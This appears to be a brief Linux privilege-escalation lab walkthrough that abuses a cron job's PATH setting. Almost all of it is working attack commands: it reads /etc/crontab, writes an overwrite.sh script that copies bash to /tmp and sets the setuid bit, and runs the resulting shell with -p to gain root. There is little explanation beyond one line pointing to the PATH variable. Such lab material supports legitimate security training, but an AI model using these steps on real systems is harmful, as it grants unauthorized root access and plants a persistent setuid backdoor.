```bash

cat /etc/crontab

```

![image](https://user-images.githubusercontent.com/96658935/147714691-fbb5c8bb-f763-4ff5-b694-afa37029c4b6.png)

From the output, notice the value of the “PATH” variable



```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
```

```bash
chmod +x /home/user/overwrite.sh
```


```bash
/tmp/bash -p

```


![image](https://user-images.githubusercontent.com/96658935/147714744-467b68ab-b4a8-455f-8580-2f717f7cbab8.png)
